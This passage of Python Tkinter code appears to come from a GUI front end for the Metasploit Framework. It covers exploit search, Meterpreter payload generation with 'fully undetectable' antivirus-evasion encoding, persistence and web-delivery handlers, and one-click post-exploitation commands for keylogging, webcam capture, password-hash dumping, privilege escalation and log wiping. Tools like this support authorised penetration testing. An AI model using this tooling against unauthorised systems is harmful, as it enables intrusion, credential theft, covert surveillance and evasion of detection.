        show_all_btn = ttk.Button(
            search_input_frame,
            text="Show All Exploits",
            command=self.show_all_exploits
        )
        show_all_btn.pack(side=tk.RIGHT, padx=(5, 0))
        
        results_frame = ttk.LabelFrame(search_frame, text="Search Results", padding="3")
        results_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 4))
        
        columns = ("Name", "Rank", "Description")
        self.exploit_tree = ttk.Treeview(results_frame, columns=columns, show="headings", height=8)
        
        for col in columns:
            self.exploit_tree.heading(col, text=col)
            self.exploit_tree.column(col, width=200)
        
        scrollbar = ttk.Scrollbar(results_frame, orient=tk.VERTICAL, command=self.exploit_tree.yview)
        self.exploit_tree.configure(yscrollcommand=scrollbar.set)
        
        self.exploit_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.exploit_tree.bind('<Double-1>', self.use_exploit)
        
        action_frame = ttk.Frame(search_frame)
        action_frame.pack(fill=tk.X)
        
        use_btn = ttk.Button(
            action_frame,
            text="Use Exploit",
            command=self.use_exploit
        )
        use_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        info_btn = ttk.Button(
            action_frame,
            text="Show Info",
            command=self.show_exploit_info
        )
        info_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        options_btn = ttk.Button(
            action_frame,
            text="Show Options",
            command=self.show_exploit_options
        )
        options_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        auto_setup_btn = ttk.Button(
            action_frame,
            text="Auto Setup Exploit",
            command=self.auto_setup_exploit
        )
        auto_setup_btn.pack(side=tk.LEFT)
    
    def create_payload_generator_tab(self):
        """Create payload generator tab."""
        payload_frame = ttk.Frame(self.notebook, padding="3")
        self.notebook.add(payload_frame, text="Payload Generator")
        
        type_frame = ttk.Frame(payload_frame)
        type_frame.pack(fill=tk.X, pady=(0, 5))
        
        ttk.Label(type_frame, text="Payload Type:").pack(side=tk.LEFT, padx=(0, 5))
        
        self.payload_type = ttk.Combobox(
            type_frame,
            values=ALL_PAYLOADS,
            state="readonly",
            width=50
        )
        self.payload_type.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 10))
        self.payload_type.set("windows/meterpreter/reverse_tcp")
        
        options_frame = ttk.LabelFrame(payload_frame, text="Options", padding="3")
        options_frame.pack(fill=tk.X, pady=(0, 5))
        
        lhost_frame = ttk.Frame(options_frame)
        lhost_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(lhost_frame, text="LHOST:", width=15).pack(side=tk.LEFT)
        self.lhost_entry = ttk.Entry(lhost_frame)
        self.lhost_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.lhost_entry.insert(0, "127.0.0.1")
        
        lport_frame = ttk.Frame(options_frame)
        lport_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(lport_frame, text="LPORT:", width=15).pack(side=tk.LEFT)
        self.lport_entry = ttk.Entry(lport_frame)
        self.lport_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.lport_entry.insert(0, "4444")
        
        format_frame = ttk.Frame(options_frame)
        format_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(format_frame, text="Format:", width=15).pack(side=tk.LEFT)
        self.format_var = tk.StringVar(value="exe")
        format_combo = ttk.Combobox(
            format_frame,
            textvariable=self.format_var,
            values=FORMATS,
            state="readonly",
            width=20
        )
        format_combo.pack(side=tk.LEFT)
        
        # FUD Options
        fud_frame = ttk.LabelFrame(payload_frame, text="FUD (Fully Undetectable) Options", padding="3")
        fud_frame.pack(fill=tk.X, pady=(0, 5))
        
        self.fud_enabled = tk.BooleanVar(value=False)
        fud_check = ttk.Checkbutton(
            fud_frame,
            text="Enable FUD (Encoding + Iterations)",
            variable=self.fud_enabled
        )
        fud_check.pack(anchor=tk.W, pady=2)
        
        encoder_frame = ttk.Frame(fud_frame)
        encoder_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(encoder_frame, text="Encoder:", width=15).pack(side=tk.LEFT)
        self.encoder_var = tk.StringVar(value="x86/shikata_ga_nai")
        encoder_combo = ttk.Combobox(
            encoder_frame,
            textvariable=self.encoder_var,
            values=ENCODERS,
            state="readonly",
            width=30
        )
        encoder_combo.pack(side=tk.LEFT)
        
        iterations_frame = ttk.Frame(fud_frame)
        iterations_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(iterations_frame, text="Iterations:", width=15).pack(side=tk.LEFT)
        self.iterations_var = tk.StringVar(value="5")
        iterations_entry = ttk.Entry(iterations_frame, textvariable=self.iterations_var, width=10)
        iterations_entry.pack(side=tk.LEFT)
        
        ttk.Label(iterations_frame, text="(Higher = more FUD but larger size)").pack(side=tk.LEFT, padx=(5, 0))
        
        # Bad characters
        badchars_frame = ttk.Frame(fud_frame)
        badchars_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(badchars_frame, text="Bad Characters:", width=15).pack(side=tk.LEFT)
        self.badchars_entry = ttk.Entry(badchars_frame)
        self.badchars_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.badchars_entry.insert(0, "\\x00\\x0a\\x0d")
        
        # Save location
        save_frame = ttk.Frame(payload_frame)
        save_frame.pack(fill=tk.X, pady=(0, 5))
        
        ttk.Label(save_frame, text="Save Location:").pack(side=tk.LEFT, padx=(0, 5))
        
        self.save_path_var = tk.StringVar(value=self.payload_save_path)
        save_path_entry = ttk.Entry(save_frame, textvariable=self.save_path_var, width=40)
        save_path_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        
        browse_btn = ttk.Button(
            save_frame,
            text="Browse",
            command=self.browse_save_location
        )
        browse_btn.pack(side=tk.RIGHT)
        
        # Generate button
        generate_btn = ttk.Button(
            payload_frame,
            text="Generate Payload",
            command=self.generate_payload
        )
        generate_btn.pack(pady=10)
        
        output_frame = ttk.LabelFrame(payload_frame, text="Generated Payload", padding="3")
        output_frame.pack(fill=tk.BOTH, expand=True)
        
        self.payload_output = scrolledtext.ScrolledText(
            output_frame,
            wrap=tk.WORD,
            font=("Consolas", 9),
            height=8
        )
        self.payload_output.pack(fill=tk.BOTH, expand=True)
        
        save_btn = ttk.Button(
            payload_frame,
            text="Save Payload to File",
            command=self.save_payload_to_file
        )
        save_btn.pack(pady=(5, 0))
    
    def create_auxiliary_tab(self):
        """Create modules tab for all module types."""
        aux_frame = ttk.Frame(self.notebook, padding="3")
        self.notebook.add(aux_frame, text="Modules")
        
        # Module type selection
        type_frame = ttk.LabelFrame(aux_frame, text="Module Type", padding="3")
        type_frame.pack(fill=tk.X, pady=(0, 5))
        
        self.aux_module_type_var = tk.StringVar(value="exploit")
        module_types = [
            ("Exploits", "exploit"),
            ("Payloads", "payload"),
            ("Auxiliary", "auxiliary"),
            ("Encoders", "encoder"),
            ("NOPs", "nop"),
            ("Post", "post"),
            ("Evasion", "evasion")
        ]
        
        for i, (label, value) in enumerate(module_types):
            rb = ttk.Radiobutton(
                type_frame,
                text=label,
                variable=self.aux_module_type_var,
                value=value
            )
            rb.grid(row=i // 4, column=i % 4, padx=5, pady=2, sticky=tk.W)
        
        search_frame = ttk.Frame(aux_frame)
        search_frame.pack(fill=tk.X, pady=(0, 5))
        
        ttk.Label(search_frame, text="Search:").pack(side=tk.LEFT, padx=(0, 5))
        
        self.aux_search_entry = ttk.Entry(search_frame)
        self.aux_search_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        self.aux_search_entry.bind('<Return>', lambda e: self.search_auxiliary())
        
        search_btn = ttk.Button(
            search_frame,
            text="Search",
            command=self.search_auxiliary
        )
        search_btn.pack(side=tk.RIGHT, padx=(5, 0))
        
        show_all_btn = ttk.Button(
            search_frame,
            text="Show All",
            command=self.show_all_modules
        )
        show_all_btn.pack(side=tk.RIGHT, padx=(5, 0))
        
        results_frame = ttk.LabelFrame(aux_frame, text="Modules", padding="3")
        results_frame.pack(fill=tk.BOTH, expand=True)
        
        columns = ("Name", "Type", "Description")
        self.aux_tree = ttk.Treeview(results_frame, columns=columns, show="headings", height=8)
        
        for col in columns:
            self.aux_tree.heading(col, text=col)
            self.aux_tree.column(col, width=200)
        
        scrollbar = ttk.Scrollbar(results_frame, orient=tk.VERTICAL, command=self.aux_tree.yview)
        self.aux_tree.configure(yscrollcommand=scrollbar.set)
        
        self.aux_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.aux_tree.bind('<Double-1>', self.use_auxiliary)
        
        # Actions
        action_frame = ttk.Frame(aux_frame)
        action_frame.pack(fill=tk.X, pady=(5, 0))
        
        use_btn = ttk.Button(
            action_frame,
            text="Use Module",
            command=self.use_auxiliary
        )
        use_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        info_btn = ttk.Button(
            action_frame,
            text="Show Info",
            command=self.show_auxiliary_info
        )
        info_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        options_btn = ttk.Button(
            action_frame,
            text="Show Options",
            command=self.show_auxiliary_options
        )
        options_btn.pack(side=tk.LEFT)
    
    def create_handler_tab(self):
        """Create automated handler setup tab."""
        handler_frame = ttk.Frame(self.notebook, padding="3")
        self.notebook.add(handler_frame, text="Handler Setup")
        
        # Handler type
        type_frame = ttk.LabelFrame(handler_frame, text="Handler Configuration", padding="3")
        type_frame.pack(fill=tk.X, pady=(0, 5))
        
        handler_type_frame = ttk.Frame(type_frame)
        handler_type_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(handler_type_frame, text="Handler Type:", width=15).pack(side=tk.LEFT)
        self.handler_type_var = tk.StringVar(value="exploit/multi/handler")
        # All available Metasploit handler types
        handler_types = [
            "exploit/multi/handler",  # Standard multi-platform handler (most common)
            "exploit/windows/local/persistence",  # Windows persistence handler
            "exploit/linux/local/persistence",  # Linux persistence handler
            "exploit/unix/local/persistence",  # Unix persistence handler
            "exploit/multi/script/web_delivery",  # Web delivery handler
            "exploit/multi/script/web_delivery_psh",  # PowerShell web delivery handler
            "exploit/multi/script/web_delivery_python",  # Python web delivery handler
            "exploit/multi/script/web_delivery_jsp",  # JSP web delivery handler
            "exploit/multi/script/web_delivery_php",  # PHP web delivery handler
        ]
        handler_combo = ttk.Combobox(
            handler_type_frame,
            textvariable=self.handler_type_var,
            values=handler_types,
            state="readonly",
            width=50
        )
        handler_combo.pack(side=tk.LEFT)
        
        # Payload
        payload_frame = ttk.Frame(type_frame)
        payload_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(payload_frame, text="Payload:", width=15).pack(side=tk.LEFT)
        self.handler_payload_var = tk.StringVar(value="windows/meterpreter/reverse_tcp")
        handler_payload_combo = ttk.Combobox(
            payload_frame,
            textvariable=self.handler_payload_var,
            values=ALL_PAYLOADS,
            state="readonly",
            width=50
        )
        handler_payload_combo.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        # LHOST
        lhost_frame = ttk.Frame(type_frame)
        lhost_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(lhost_frame, text="LHOST:", width=15).pack(side=tk.LEFT)
        self.handler_lhost_entry = ttk.Entry(lhost_frame)
        self.handler_lhost_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.handler_lhost_entry.insert(0, "0.0.0.0")
        
        # LPORT
        lport_frame = ttk.Frame(type_frame)
        lport_frame.pack(fill=tk.X, pady=2)
        
        ttk.Label(lport_frame, text="LPORT:", width=15).pack(side=tk.LEFT)
        self.handler_lport_entry = ttk.Entry(lport_frame)
        self.handler_lport_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.handler_lport_entry.insert(0, "4444")
        
        # Auto migrate
        migrate_frame = ttk.Frame(type_frame)
        migrate_frame.pack(fill=tk.X, pady=2)
        
        self.auto_migrate_var = tk.BooleanVar(value=True)
        migrate_check = ttk.Checkbutton(
            migrate_frame,
            text="Auto migrate to explorer.exe",
            variable=self.auto_migrate_var
        )
        migrate_check.pack(anchor=tk.W)
        
        # Exit on session
        exit_frame = ttk.Frame(type_frame)
        exit_frame.pack(fill=tk.X, pady=2)
        
        self.exit_on_session_var = tk.BooleanVar(value=False)
        exit_check = ttk.Checkbutton(
            exit_frame,
            text="Exit on session (for automation)",
            variable=self.exit_on_session_var
        )
        exit_check.pack(anchor=tk.W)
        
        # Buttons
        button_frame = ttk.Frame(handler_frame)
        button_frame.pack(fill=tk.X, pady=10)
        
        setup_btn = ttk.Button(
            button_frame,
            text="Setup Handler",
            command=self.setup_handler
        )
        setup_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        start_btn = ttk.Button(
            button_frame,
            text="Start Handler",
            command=self.start_handler
        )
        start_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        stop_btn = ttk.Button(
            button_frame,
            text="Stop Handler",
            command=self.stop_handler
        )
        stop_btn.pack(side=tk.LEFT)
        
        # Status
        status_frame = ttk.LabelFrame(handler_frame, text="Handler Status", padding="3")
        status_frame.pack(fill=tk.BOTH, expand=True)
        
        self.handler_status = scrolledtext.ScrolledText(
            status_frame,
            wrap=tk.WORD,
            font=("Consolas", 9),
            height=8
        )
        self.handler_status.pack(fill=tk.BOTH, expand=True)
    
    def create_commands_tab(self):
        """Create commands and help tab."""
        commands_frame = ttk.Frame(self.notebook, padding="3")
        self.notebook.add(commands_frame, text="Commands & Help")
        
        # Category selection
        category_frame = ttk.LabelFrame(commands_frame, text="Command Categories", padding="3")
        category_frame.pack(fill=tk.X, pady=(0, 5))
        
        categories = [
            "General", "Exploit", "Payload", "Auxiliary", "Post", "Session",
            "Database", "Resource", "Encoder", "NOP", "Evasion", "Meterpreter"
        ]
        
        self.command_category_var = tk.StringVar(value="General")
        for i, cat in enumerate(categories):
            rb = ttk.Radiobutton(
                category_frame,
                text=cat,
                variable=self.command_category_var,
                value=cat,
                command=self.update_commands_display
            )
            rb.grid(row=i // 4, column=i % 4, padx=5, pady=2, sticky=tk.W)
        
        # Commands display
        display_frame = ttk.LabelFrame(commands_frame, text="Commands", padding="3")
        display_frame.pack(fill=tk.BOTH, expand=True)
        
        self.commands_display = scrolledtext.ScrolledText(
            display_frame,
            wrap=tk.WORD,
            font=("Consolas", 9),
            height=15
        )
        self.commands_display.pack(fill=tk.BOTH, expand=True)
        
        # Load initial commands
        self.update_commands_display()
        
        # Quick help buttons
        help_frame = ttk.Frame(commands_frame)
        help_frame.pack(fill=tk.X, pady=(5, 0))
        
        help_btn = ttk.Button(
            help_frame,
            text="Show Full Help",
            command=self.show_full_help
        )
        help_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        version_btn = ttk.Button(
            help_frame,
            text="Show Version",
            command=self.show_version
        )
        version_btn.pack(side=tk.LEFT)
    
    def create_session_manager_tab(self):
        """Create session manager tab."""
        session_frame = ttk.Frame(self.notebook, padding="3")
        self.notebook.add(session_frame, text="Session Manager")
        
        list_frame = ttk.LabelFrame(session_frame, text="Active Sessions", padding="3")
        list_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 5))
        
        columns = ("ID", "Type", "Information", "Opened")
        self.session_tree = ttk.Treeview(list_frame, columns=columns, show="headings", height=8)
        
        for col in columns:
            self.session_tree.heading(col, text=col)
            self.session_tree.column(col, width=150)
        
        scrollbar = ttk.Scrollbar(list_frame, orient=tk.VERTICAL, command=self.session_tree.yview)
        self.session_tree.configure(yscrollcommand=scrollbar.set)
        
        self.session_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        action_frame = ttk.Frame(session_frame)
        action_frame.pack(fill=tk.X)
        
        refresh_btn = ttk.Button(
            action_frame,
            text="Refresh Sessions",
            command=self.refresh_sessions
        )
        refresh_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        interact_btn = ttk.Button(
            action_frame,
            text="Interact",
            command=self.interact_session
        )
        interact_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        kill_btn = ttk.Button(
            action_frame,
            text="Kill Session",
            command=self.kill_session
        )
        kill_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        upgrade_btn = ttk.Button(
            action_frame,
            text="Upgrade to Meterpreter",
            command=self.upgrade_session
        )
        upgrade_btn.pack(side=tk.LEFT)
    
    def create_meterpreter_tab(self):
        """Create Meterpreter management tab."""
        meterpreter_frame = ttk.Frame(self.notebook, padding="3")
        self.notebook.add(meterpreter_frame, text="Meterpreter Manager")
        
        # Session selection
        session_frame = ttk.LabelFrame(meterpreter_frame, text="Active Meterpreter Sessions", padding="3")
        session_frame.pack(fill=tk.BOTH, expand=False, pady=(0, 5))
        
        columns = ("ID", "Type", "Platform", "Arch", "User", "Info")
        self.meterpreter_tree = ttk.Treeview(session_frame, columns=columns, show="headings", height=5)
        
        for col in columns:
            self.meterpreter_tree.heading(col, text=col)
            self.meterpreter_tree.column(col, width=120)
        
        scrollbar = ttk.Scrollbar(session_frame, orient=tk.VERTICAL, command=self.meterpreter_tree.yview)
        self.meterpreter_tree.configure(yscrollcommand=scrollbar.set)
        
        self.meterpreter_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.meterpreter_tree.bind('<Double-1>', self.interact_meterpreter)
        
        # Session controls
        session_control_frame = ttk.Frame(meterpreter_frame)
        session_control_frame.pack(fill=tk.X, pady=(0, 5))
        
        refresh_meterpreter_btn = ttk.Button(
            session_control_frame,
            text="Refresh Sessions",
            command=self.refresh_meterpreter_sessions
        )
        refresh_meterpreter_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        interact_meterpreter_btn = ttk.Button(
            session_control_frame,
            text="Interact",
            command=self.interact_meterpreter
        )
        interact_meterpreter_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        # Meterpreter command input
        command_frame = ttk.LabelFrame(meterpreter_frame, text="Meterpreter Commands", padding="3")
        command_frame.pack(fill=tk.X, pady=(0, 5))
        
        input_container = ttk.Frame(command_frame)
        input_container.pack(fill=tk.X)
        
        ttk.Label(input_container, text="Command:").pack(side=tk.LEFT, padx=(0, 5))
        
        self.meterpreter_command_entry = ttk.Entry(input_container)
        self.meterpreter_command_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        self.meterpreter_command_entry.bind('<Return>', lambda e: self.send_meterpreter_command())
        
        send_meterpreter_btn = ttk.Button(
            input_container,
            text="Send",
            command=self.send_meterpreter_command
        )
        send_meterpreter_btn.pack(side=tk.RIGHT)
        
        # Quick commands - use a scrollable frame for better space management
        quick_cmds_frame = ttk.LabelFrame(meterpreter_frame, text="Quick Commands", padding="3")
        quick_cmds_frame.pack(fill=tk.BOTH, expand=False, pady=(0, 5))
        
        # Create a canvas for scrolling
        quick_canvas = tk.Canvas(quick_cmds_frame, height=100)
        quick_scrollbar = ttk.Scrollbar(quick_cmds_frame, orient="vertical", command=quick_canvas.yview)
        quick_scrollable_frame = ttk.Frame(quick_canvas)
        
        def on_frame_configure(event):
            quick_canvas.configure(scrollregion=quick_canvas.bbox("all"))
        
        quick_scrollable_frame.bind("<Configure>", on_frame_configure)
        
        quick_canvas.create_window((0, 0), window=quick_scrollable_frame, anchor="nw")
        quick_canvas.configure(yscrollcommand=quick_scrollbar.set)
        
        # Add mouse wheel support
        def on_mousewheel(event):
            quick_canvas.yview_scroll(int(-1 * (event.delta / 120)), "units")
        
        quick_canvas.bind("<MouseWheel>", on_mousewheel)
        quick_scrollable_frame.bind("<MouseWheel>", on_mousewheel)
        
        quick_meterpreter_commands = [
            ("sysinfo", "sysinfo"),
            ("getuid", "getuid"),
            ("pwd", "pwd"),
            ("ls", "ls"),
            ("ps", "ps"),
            ("shell", "shell"),
            ("background", "background"),
            ("screenshot", "screenshot"),
            ("webcam_snap", "webcam_snap"),
            ("keyscan_start", "keyscan_start"),
            ("keyscan_dump", "keyscan_dump"),
            ("keyscan_stop", "keyscan_stop"),
            ("upload", "upload"),
            ("download", "download"),
            ("migrate", "migrate"),
            ("hashdump", "hashdump"),
            ("getsystem", "getsystem"),
            ("clearev", "clearev"),
            ("timestomp", "timestomp"),
            ("smart_hashdump", "run post/windows/gather/smart_hashdump"),
        ]
        
        for i, (label, cmd) in enumerate(quick_meterpreter_commands):
            btn = ttk.Button(
                quick_scrollable_frame,
                text=label,
                command=lambda c=cmd: self.quick_meterpreter_command(c),
                width=18
            )
            btn.grid(row=i // 6, column=i % 6, padx=2, pady=1, sticky=(tk.W, tk.E))
        
        for col in range(6):
            quick_scrollable_frame.columnconfigure(col, weight=1)
        
        quick_canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        quick_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # File operations - use a more compact layout
        file_frame = ttk.LabelFrame(meterpreter_frame, text="File Operations", padding="3")
        file_frame.pack(fill=tk.X, pady=(0, 5))
        
        # Upload section
        upload_frame = ttk.Frame(file_frame)
        upload_frame.pack(fill=tk.X, pady=(0, 3))
        
        ttk.Label(upload_frame, text="Upload:", width=10).pack(side=tk.LEFT, padx=(0, 5))
        self.meterpreter_local_file = ttk.Entry(upload_frame, width=35)
        self.meterpreter_local_file.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        
        browse_local_btn = ttk.Button(
            upload_frame,
            text="Browse",
            command=self.browse_meterpreter_local_file
        )
        browse_local_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Label(upload_frame, text="→", width=2).pack(side=tk.LEFT, padx=(0, 5))
        self.meterpreter_remote_path = ttk.Entry(upload_frame, width=35)
        self.meterpreter_remote_path.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        
        upload_btn = ttk.Button(
            upload_frame,
            text="Upload",
            command=self.meterpreter_upload_file
        )
        upload_btn.pack(side=tk.LEFT, padx=(0, 5))
        
        download_btn = ttk.Button(
            upload_frame,
            text="Download",
            command=self.meterpreter_download_file
        )
        download_btn.pack(side=tk.LEFT)
        
        # Output display
        output_frame = ttk.LabelFrame(meterpreter_frame, text="Meterpreter Output", padding="3")
        output_frame.pack(fill=tk.BOTH, expand=True)
        
        self.meterpreter_output = scrolledtext.ScrolledText(
            output_frame,
            wrap=tk.WORD,
            font=("Consolas", 9),
            height=8
        )
        self.meterpreter_output.pack(fill=tk.BOTH, expand=True)
        
        self.meterpreter_output.tag_config("output", foreground="#d4d4d4")
        self.meterpreter_output.tag_config("error", foreground="#f48771")
        self.meterpreter_output.tag_config("success", foreground="#4ec9b0")
        self.meterpreter_output.tag_config("warning", foreground="#dcdcaa")
    
    # Console methods
    def start_console(self):
        """Start Metasploit console."""
        if self.console and self.console.running:
            messagebox.showinfo("Info", "Console is already running.")
            return
        
        # Get current window position for password dialog positioning
        self.root.update_idletasks()
        window_x = self.root.winfo_x()
        window_y = self.root.winfo_y()
        
        self.console = MetasploitConsole(output_callback=self.console_output_callback)
        preferred_monitor = self.settings.get('preferred_monitor', 'primary')
        if self.console.start(window_x=window_x, window_y=window_y, preferred_monitor=preferred_monitor):
            self.start_btn.config(state="disabled")
            self.stop_btn.config(state="normal")
            self.console_output_callback("Metasploit console started.\n", "success")
            
            # Update window position in environment when window moves
            def update_window_pos():
                if self.console and self.console.running:
                    try:
                        x = self.root.winfo_x()
                        y = self.root.winfo_y()
                        os.environ['YAP_GUI_X'] = str(x)
                        os.environ['YAP_GUI_Y'] = str(y)
                    except:
                        pass
                    # Check again in 1 second
                    self.root.after(1000, update_window_pos)
            
            # Start tracking window position
            self.root.after(1000, update_window_pos)
            
            # Check database status after a short delay
            self.root.after(1000, self.check_database_status)
        else:
            messagebox.showerror("Error", "Failed to start Metasploit console.\nMake sure Metasploit Framework is installed.")
    
    def stop_console(self):
        """Stop Metasploit console."""
        if self.console:
            self.console.stop()
            self.console = None
            self.start_btn.config(state="normal")
            self.stop_btn.config(state="disabled")
            self.console_output_callback("Metasploit console stopped.\n", "warning")
    
    def console_output_callback(self, text, tag="output"):
        """Callback for console output."""
        def _update():
            self.console_output.insert(tk.END, text, tag)
            self.console_output.see(tk.END)
            
            # Check for database connection status
            text_lower = text.lower()
            
            # Check for connection errors
            if ("database not connected" in text_lower or 
                "no database connection" in text_lower or
                "postgresql selected, no connection" in text_lower or
                "a url or saved data service name is required" in text_lower):
                self.database_connected = False
                self.update_database_status()
                # Auto-initialize if not already initializing (only once per error)
                if not self.database_initializing and self.settings.get('auto_init_db', True):
                    # Use a flag to prevent multiple auto-init attempts
                    if not hasattr(self, '_auto_init_attempted'):
                        self._auto_init_attempted = True
                        self.root.after(3000, self.auto_initialize_database)  # Wait 3 seconds before auto-init
                        self.root.after(10000, lambda: setattr(self, '_auto_init_attempted', False))  # Reset after 10s
            
            # Check for successful connection
            elif ("connected to msf" in text_lower or 
                  "database connected" in text_lower or
                  "connected to the data service" in text_lower or
                  "postgresql connected" in text_lower or
                  "connection type: postgresql" in text_lower):
                self.database_connected = True
                self.database_initializing = False
                self._auto_init_attempted = False
                self.update_database_status()
                # Cancel any pending connection attempts
                if hasattr(self, '_connection_attempts'):
                    self._connection_attempts = []
            
            # Check for "already connected" - this is actually success!
            # Also check for "Current connection information" which indicates we're connected
            elif ("connection already established" in text_lower or
                  "current connection information" in text_lower):
                # If we see connection info, we're connected
                self.database_connected = True
                self.database_initializing = False
                self._auto_init_attempted = False
                self.update_database_status()
                # Cancel any pending connection attempts
                if hasattr(self, '_connection_attempts'):
                    self._connection_attempts = []
            
            # Check for initialization status
            elif ("database initialization" in text_lower or 
                  "initializing database" in text_lower or
                  "running database migrations" in text_lower):
                self.database_initializing = True
                self.update_database_status()
            
            # Check db_status output
            elif "db_status" in text or "database status" in text_lower:
                if "not connected" in text_lower or "no connection" in text_lower:
                    self.database_connected = False
                    self.update_database_status()
                elif "connected" in text_lower and "not" not in text_lower:
                    self.database_connected = True
                    self.database_initializing = False
                    self.update_database_status()
            
            # Check for saved service names from db_connect -l
            elif "saved data services" in text_lower or "available data services" in text_lower:
                # Try to extract service name and use it
                import re
                # Look for service names (usually listed after the header)
                service_match = re.search(r'^\s*(\w+)\s', text, re.MULTILINE)
                if service_match and not self.database_connected:
                    service_name = service_match.group(1)
                    self.console_output_callback(f"Found saved service: {service_name}. Attempting to connect...\n", "output")
                    self.root.after(1000, lambda sn=service_name: self.console.send_command(f"db_connect {sn}"))
            
            # Parse search results if we're in search mode
            if self.active_search:
                self._parse_search_output(text)
            
            # Parse nmap scan results if we're scanning
            if self.scanning:
                # Always parse with _parse_nmap_output - it handles both formats
                # Also call _parse_services_table_output if we detect services table format
                # (as a backup/alternative parser)
                self._parse_nmap_output(text)
                
                # Also try _parse_services_table_output if this looks like services table format
                # This format comes from "services" command in Metasploit
                # Check for services table format (IP PORT PROTOCOL SERVICE STATE)
                if re.search(r'\d+\.\d+\.\d+\.\d+\s+\d+\s+\w+\s+\S+\s+\w+', text):
                    # Also try the dedicated services table parser
                    self._parse_services_table_output(text)
                
                # Also try to get results directly from database after scan completes
                # Check for scan completion indicators
                if "Nmap done" in text or "scan completed" in text.lower() or re.search(r'Nmap scan report for', text) or "db_nmap" in text:
                    # Schedule a database query to get all results
                    if self.database_connected and self.current_scan_target:
                        self.root.after(3000, lambda: self._refresh_scan_results_from_db())
            
            # Parse hosts command output
            # Check if this looks like hosts table output
            if "Hosts" in text or ("address" in text.lower() and "mac" in text.lower() and "name" in text.lower()):
                # Buffer hosts output and parse when we see the full table
                if not hasattr(self, 'hosts_output_buffer'):
                    self.hosts_output_buffer = []
                self.hosts_output_buffer.append(text)
                
                # Check if we've seen the full table (ends with prompt or empty line after data)
                if re.search(r'msf[56]?\s*>', text) or (len(self.hosts_output_buffer) > 1 and "=====" in ''.join(self.hosts_output_buffer)):
                    # Process the buffered output
                    full_hosts_output = ''.join(self.hosts_output_buffer)
                    self._parse_hosts_output(full_hosts_output)
                    self.hosts_output_buffer = []
            
            # Parse services command output (for database manager, not just scanning)
            # Check if this looks like services table output and we're not scanning
            if not self.scanning and (re.search(r'\d+\.\d+\.\d+\.\d+\s+\d+\s+\w+\s+\S+\s+\w+', text) or 
                                      ("Services" in text and "=====" in text)):
                # Buffer services output
                if not hasattr(self, 'services_output_buffer'):
                    self.services_output_buffer = []
                self.services_output_buffer.append(text)
                
                # Check if we've seen the full table
                if re.search(r'msf[56]?\s*>', text) or (len(self.services_output_buffer) > 1 and "=====" in ''.join(self.services_output_buffer)):
                    full_services_output = ''.join(self.services_output_buffer)
                    self._parse_services_output_db(full_services_output)
                    self.services_output_buffer = []
            
            # Parse vulnerabilities command output
            if "Vulnerabilities" in text or ("vulnerabilities" in text.lower() and "=====" in text):
                # Buffer vulns output
                if not hasattr(self, 'vulns_output_buffer'):
                    self.vulns_output_buffer = []
                self.vulns_output_buffer.append(text)
                
                # Check if we've seen the full table
                if re.search(r'msf[56]?\s*>', text) or (len(self.vulns_output_buffer) > 1 and "=====" in ''.join(self.vulns_output_buffer)):
                    full_vulns_output = ''.join(self.vulns_output_buffer)
                    self._parse_vulns_output(full_vulns_output)
                    self.vulns_output_buffer = []
            
            # Parse loot command output
            if "Loot" in text or ("loot" in text.lower() and "=====" in text):
                # Buffer loot output
                if not hasattr(self, 'loot_output_buffer'):
                    self.loot_output_buffer = []
                self.loot_output_buffer.append(text)
                
                # Check if we've seen the full table
                if re.search(r'msf[56]?\s*>', text) or (len(self.loot_output_buffer) > 1 and "=====" in ''.join(self.loot_output_buffer)):
                    full_loot_output = ''.join(self.loot_output_buffer)
                    self._parse_loot_output(full_loot_output)
                    self.loot_output_buffer = []
            
            # Parse credentials command output
            if "Credentials" in text or ("credentials" in text.lower() and "=====" in text):
                # Buffer creds output
                if not hasattr(self, 'creds_output_buffer'):
                    self.creds_output_buffer = []
                self.creds_output_buffer.append(text)
                
                # Check if we've seen the full table
